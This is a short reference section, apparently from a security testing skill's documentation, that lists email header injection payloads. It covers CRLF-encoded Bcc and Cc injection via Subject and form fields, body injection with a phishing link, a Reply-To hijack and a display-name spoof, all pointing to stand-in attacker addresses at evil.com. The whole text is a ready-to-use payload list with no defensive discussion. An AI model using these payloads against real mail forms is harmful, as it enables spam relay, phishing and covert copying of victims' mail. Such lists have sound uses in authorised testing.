# email-header-injection technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 9. QUICK REFERENCE — KEY PAYLOADS

```text
# BCC injection via Subject
Subject: Hello%0d%0aBcc:attacker@evil.com

# Body injection via From name
From: Test%0d%0a%0d%0aClick here: https://evil.com

# Reply-To hijack
From: Support%0d%0aReply-To:attacker@evil.com

# Full header stack injection
email=victim%40target.com%0d%0aCc%3aspy1%40evil.com%0d%0aBcc%3aspy2%40evil.com

# Display name spoof (no injection needed)
From: "security@target.com" <attacker@evil.com>
```
